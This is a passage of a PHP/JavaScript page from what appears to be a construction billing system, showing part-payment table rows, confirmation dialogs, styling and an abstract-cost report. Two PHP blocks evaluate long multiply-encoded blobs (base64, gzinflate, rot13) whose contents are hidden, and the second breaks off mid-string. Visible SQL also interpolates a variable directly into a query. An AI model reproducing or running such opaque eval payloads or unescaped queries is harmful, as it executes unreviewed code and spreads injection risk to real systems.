							var addbtn=document.createElement("input");
								addbtn.type = "button";
								addbtn.value = " + ";
								addbtn.id = "btn_add_row_slm1"+index;
								addbtn.name = "btn_add_row_slm";
								addbtn.setAttribute('class', "delbtnstyle");
								addbtn.style.width = 32+"px";
								addbtn.style.borderRadius = 0+"px";
								addbtn.onclick = function () {
												  addRow()
												}
								cell5.appendChild(addbtn);
						
						
						}
						else
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var delbtn=document.createElement("input");
								delbtn.type = "button";
								delbtn.value = " X ";
								delbtn.id = "btn_delete"+index;
								delbtn.name = "btn_delete";
								delbtn.setAttribute('class', "delbtnstyle");
								delbtn.style.width = 32+"px";
								delbtn.style.borderRadius = 0+"px";
								delbtn.onclick = (function (ind) {
												  //deleteRow(row.id)
												  	return function() {
													deleteRow(this);
													};
												})(index);
								cell5.appendChild(delbtn);
						}	
						
							//var cell6=row.insertCell(5);
							//cell5.style.width = 10+"px";
							//cell6.style.textAlign = "center";
							//cell6.style.padding = "0px 0px 0px 0px";
							//cell6style.visibility = "hidden";	
							
					// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
						var txt_box5 = document.createElement("input");
							txt_box5.type = "hidden";
							txt_box5.id = "hid_slm_result"+index;
							txt_box5.name = "hid_slm_result1[]";
							txt_box5.value = result;
							txt_box5.setAttribute('class', "dynamictextbox");
							txt_box5.style.width = 70+"px";
							txt_box5.style.borderRadius = 0+"px";
							cell5.appendChild(txt_box5);
							index++;
						var elmt = document.getElementById("rowid0");
							elmt.style.display = "none";
							totalAmountCalculation("slm");
						//index++;
							result = "";
					}
					if(SlmRemarks != "")
					{
						document.getElementById("txt_slm_remarks").value = SlmRemarks;
					}
					else
					{
						document.getElementById("txt_slm_remarks").value = "";
					}
				}totalAmountCalculation("slm");
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);

			}
		}
		xmlHttp.send(strURL);	
	}
	
	function saveDataDetails()
	{
		var result1 = "X";
		$('input[name="hid_slm_result[]"]').each(function() {
			var res1 = $(this).val();
			if(res1 != "")
			{
				result1 = res1 + "@"+ result1;
			}
		});
		
		var result2 = "Y";
		$('input[name="hid_dpm_result[]"]').each(function() {
			var res2 = $(this).val();
			result2 = res2 + "@"+ result2;
		});
		//alert(result1)
		//alert(result2)
		var result = result1 + "###" + result2;
		//alert(result);
		var itemid = document.getElementById("txt_item_id").value;
		var itemStr = document.getElementById("hid_item_str").value;
		var SlmRemarks = document.getElementById("txt_slm_remarks").value;
		var DpmRemarks = document.getElementById("txt_dpm_remarks").value;
		var RemarksStr = SlmRemarks + "@*@" + DpmRemarks;
		//alert(result);
		var sheetid = document.getElementById("txt_sheet_id").value;
		$.post("Partpayment_Update.php", {resultdata: result, sheetid: sheetid, itemStr: itemStr, RemarksStr: RemarksStr}, function (data) {
		//alert(data);
			if(data == 1)
			{
				
				//swal("", "Sucessfully Updated...!", "success");
				location.reload();
				//$.modal.close();
				
			}
        });
		
	}
	
	function ShowRemarks(id)
	{
		var idcount = id;
		var RemarksData = document.getElementById("hid_dpm_remarkdata"+idcount).value;
		swal({
		title: "<small>Deduct Previous Measurement Remarks</small>",
		text: "<small>"+RemarksData+"</small>",
		html: true
	});
	}
	
	function SaveData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to update this data..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Update!",   
			cancelButtonText: "No, Cancel!",   
			closeOnConfirm: false,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{     
				saveDataDetails();  
			} 
			else 
			{     
				swal("Cancelled", "Your data not updated:)", "error");   
			} 
		});
	}
	function CancelData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to Cancel this operation..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Cancel!",   
			cancelButtonText: "No, Stay on this!",   
			closeOnConfirm: true,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{   
				  
				$.modal.close();  
			} 
			else 
			{     
				swal({   
				title: "Please Wait!",   
				text: "Your Page will be redirected..",   
				timer: 2000,   showConfirmButton: false 
				});
			} 
		});
	}
</script>
<style>
.pagetitle
{
	text-shadow:
    -1px -1px 0 #7F7F7F,
    1px -1px 0 #7F7F7F,
    -1px 1px 0 #7F7F7F,
    1px 1px 0 #7F7F7F; 
}
.table1
{
	color:#BF0602;
	/*color:#921601;*/
	border: 1px solid #d7d8d6;
	border-collapse: collapse;
}
.table1 td
{ 
	border: 1px solid #d7d8d6;
	border-collapse: collapse;
}
.fontcolor1
{
	color:#FFFFFF;
}
.fontcolor2
{
	color:#de0117;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-weight:bold;
	font-size:11px;
}
.table1 td:hover
{
	color:#1013A0;
}
.popuptitle
{
	/*background-color:#0080FF;*/
	background-color:#0A9CC5;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.table2
{
	color:#071A98;
	border:1px solid #d7d8d6;
	border-collapse: collapse;
}
.table2 td
{
	border:1px solid #d7d8d6;
	border-collapse: collapse;
}
.bottomsection
{
 	position: absolute;
    bottom: 0;
	width:100%;
	line-height:38px;
}
.buttonsection
{
	display: inline-block;
	line-height:38px;
}
.buttonstyle
{
	background-color:#0A9CC5;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #0A9CC5;
	-webkit-box-shadow: 0px 1px 0px 0px #0A9CC5;
	box-shadow: 0px 1px 0px 0px #0A9CC5;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #0A9CC5));
	background:-moz-linear-gradient(top, #0080FF 5%, #0A9CC5 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #0A9CC5 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #0A9CC5 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #0A9CC5 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #0A9CC5 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#0A9CC5',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}

.popuptextbox
{
	border:none;
	font-family:Verdana;
	font-size:12px;
	font-weight:bold;
	color:#DE0117;
	text-align:center;
	pointer-events: none;
}
.dynamictextbox
{
	border:1px solid #ffffff;
	height:21px;
	color:#DE0117;
	font-weight:bold;
}
.dynamictextbox:hover, .dynamictextbox:focus
{
	/*outline: none;*/
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
    /*border-color: #9ecaed;
    box-shadow: 0 0 10px #9ecaed;*/
}
.dynamictextbox2
{
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
	text-align:right;	
}
.dynamicrowcell
{
	padding-bottom:0px;
	padding-top:0px; 
	padding-left:0px; 
	padding-right:0px;
	text-align:right;
	font:Verdana, Arial, Helvetica, sans-serif;
}
.hide
{
	display:none;
}
.gradientbg {
  /* fallback */
  background-color: #014D62;
  background: url(images/linear_bg_2.png);
  background-repeat: repeat-x;

  /* Safari 4-5, Chrome 1-9 */
  background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#037595), to(#0A9CC5));

  /* Safari 5.1, Chrome 10+ */
  background: -webkit-linear-gradient(top, #0A9CC5, #037595);

  /* Firefox 3.6+ */
  background: -moz-linear-gradient(top, #0A9CC5, #037595);

  /* IE 10 */
  background: -ms-linear-gradient(top, #0A9CC5, #037595);

  /* Opera 11.10+ */
  background: -o-linear-gradient(top, #0A9CC5, #037595);
}
.borderstyle
{
	border-top:2px solid #0A9CC5; 
	border-left:2px solid #0A9CC5; 
	border-right:2px solid #0A9CC5;
	border-bottom:2px solid #0A9CC5;
}
/*.table1 tr:nth-child(even) {background: #CCC}
.table1 tr:nth-child(odd) {background: #FFF}*/
</style>		
<body bgcolor="black" onload="setRowSpan();noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<table width="1087px" height="56px" align="center" class='label' bgcolor="#0A9CC5">
	<tr bgcolor="#0A9CC5" style="position:fixed;">
		<td style="color:#FFFFFF; border:none;" width="1077px"  height="48px" class="" align="center">
		<?php echo "Abstract Cost for ".$short_name." for the period of ".date("d/m/Y", strtotime($fromdate))." to ".date("d/m/Y", strtotime($todate)); ?>
		<br/>
		<?php echo "RAB : ".$runn_acc_bill_no; ?>
		</td>
	</tr>
</table>
<form name="form" method="post">
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

//$tablehead = $tablehead . "</table>";
?>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' style="" cellspacing='3' align='center' class='label table1' bgcolor="#FFFFFF" id="table1">
<?php echo $tablehead; ?>
<tr bgcolor="#d4d8d8" style="height:1px;"><td colspan="13"></td></tr>
<?php 
$color_var = 0; $table_group_row = 0; $temp_array = array();$OverAllSlmAmount = 0; $OverAllDpmAmount = 0; $OverAllSlmDpmAmount = 0; $SubdividDpmStr = "";
$unionqur = "(SELECT subdivid  FROM mbookgenerate WHERE sheetid = '$abstsheetid') UNION (SELECT subdivid  FROM measurementbook WHERE sheetid = '$abstsheetid' AND (part_pay_flag = '0' OR part_pay_flag = '1'))";
$unionsql = mysql_query($unionqur);
while($Listsubdivid = mysql_fetch_array($unionsql)) { $subdivid_list .= $Listsubdivid['subdivid']."*"; }
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
natsort($subdivisionlist_1);
foreach($subdivisionlist_1 as $key => $summ_1)
{
   if($summ_1 != "")
   {
      $subdivisionlist_2 .= $summ_1.",";
   }
}
$subdivisionlist = explode(',',rtrim($subdivisionlist_2,","));
for($i=0;$i<count($subdivisionlist);$i++)
{
eval(str_rot13(gzinflate(str_rot13(base64_decode('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